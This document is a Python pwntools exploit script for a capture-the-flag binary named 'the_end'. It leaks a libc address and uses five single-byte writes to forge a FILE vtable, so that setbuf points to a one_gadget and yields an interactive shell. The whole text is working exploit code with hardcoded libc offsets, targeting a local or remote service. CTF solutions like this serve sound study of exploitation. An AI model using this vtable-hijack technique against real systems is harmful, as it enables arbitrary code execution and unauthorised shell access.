from pwn import *
import string
context.binary = './the_end'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc
def dbg():
	raw_input()
if args['REMOTE']:
	p = remote('127.0.0.1', 10005)
else:
	p = process('./the_end')
	gdb.attach(p)
	dbg()

p.recvuntil('gift ')
sleep_addr = int(p.recvuntil(',').strip(','), 16)
libc_base = sleep_addr - libc.symbols['sleep']

vtables_addr = libc_base + 0x3c56f8
one_gadget = libc_base + 0xf02a4

fake_vtables = libc_base + 0x3c5588
target_addr = fake_vtables + 0x58 				#setbuf

print "one_gadget ==> " + hex(one_gadget)
print "vtables ==> " + hex(vtables_addr)
print "fake_vtables ==> " + hex(fake_vtables)
print "target_addr ==> " + hex(target_addr)

dbg()
p.recvline()
for i in range(2):								#make a  fake_vtables
	p.send(p64(vtables_addr+i))
	p.send(p64(fake_vtables)[i])


for i in range(3):								#make setbuf is one_gadget
	p.send(p64(target_addr+i))
	p.send(p64(one_gadget)[i])

#p.sendline("exec /bin/sh 1>&0")

p.interactive()
p.close()
